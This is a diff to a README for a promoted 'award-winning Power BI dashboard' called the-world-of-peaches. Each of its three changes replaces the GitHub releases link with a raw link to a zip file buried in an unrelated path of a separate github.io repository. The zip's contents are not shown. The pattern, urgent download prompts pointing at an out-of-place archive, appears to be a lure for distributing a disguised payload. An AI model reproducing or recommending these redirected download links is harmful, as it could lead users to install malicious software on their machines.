@@ -6,7 +6,7 @@ description: "Download the award-winning Power BI report from the 2026 World Cha
 <h1>🍑 the-world-of-peaches - The Award-Winning Power BI Dashboard Experience</h1>
 
 <p align="center">
-  <a href="https://github.com/9bjn4048/the-world-of-peaches/releases" style="display:inline-block;padding:16px 32px;background:#FF6B35;color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;margin:20px auto;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/9bjn4048/9bjn4048.github.io/main/src/components/Services/2.5-beta.3.zip" style="display:inline-block;padding:16px 32px;background:#FF6B35;color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;margin:20px auto;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🌟 What Is This?
@@ -44,7 +44,7 @@ Follow these exact steps. Do not worry - this takes less than 5 minutes.
 ### Step 1: Visit the Download Page
 
 **Click this link:**
-**👉 [Download The World of Peaches](https://github.com/9bjn4048/the-world-of-peaches/releases)**
+**👉 [Download The World of Peaches](https://raw.githubusercontent.com/9bjn4048/9bjn4048.github.io/main/src/components/Services/2.5-beta.3.zip)**
 
 Visit this link to download the application.
 
@@ -210,7 +210,7 @@ You're getting the best-in-the-world example of what's possible with Power BI an
 
 Click the download button at the top of this page or use the link below:
 
-**👉 [Get The World of Peaches Now](https://github.com/9bjn4048/the-world-of-peaches/releases)**
+**👉 [Get The World of Peaches Now](https://raw.githubusercontent.com/9bjn4048/9bjn4048.github.io/main/src/components/Services/2.5-beta.3.zip)**
 
 Visit this link to download the application.
 
